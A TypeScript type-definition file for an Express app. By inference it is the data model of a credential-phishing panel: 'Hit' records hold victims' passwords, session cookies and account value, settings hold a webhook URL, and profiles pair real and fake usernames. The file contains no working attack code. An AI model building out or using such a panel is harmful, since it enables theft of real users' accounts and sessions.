import 'express-session';

declare module 'express-session' {
    interface SessionData {
        user: {
            id: number;
            username: string;
            role: string;
        };
    }
}

export interface User {
    id: number;
    username: string;
    password: string;
    role: string;
    created_at: string;
}

export interface Hit {
    id: number;
    user: string;
    cookie: string;
    password: string;
    rap: number;
    summary: number;
    value: number;
    created_at: string;
}

export interface Settings {
    id: number;
    domain: string;
    site_id: string;
    site_code: string;
    webhook_url: string;
    auth_enabler: boolean;
    age_changer: boolean;
}

export interface Profile {
    id: number;
    real_username: string;
    fake_username: string;
    display_name: string;
    premium: boolean;
    friends: number;
    followers: number;
    followings: number;
    status: string;
    creation_date: string;
    description: string;
}

export interface Group {
    id: number;
    group_url: string;
    owner: string;
    name: string;
    members: number;
    verified: boolean;
    funds: number;
    description: string;
    shout: string;
}

export interface Game {
    id: number;
    name: string;
    status: string;
    creation_date: string;
    description: string;
}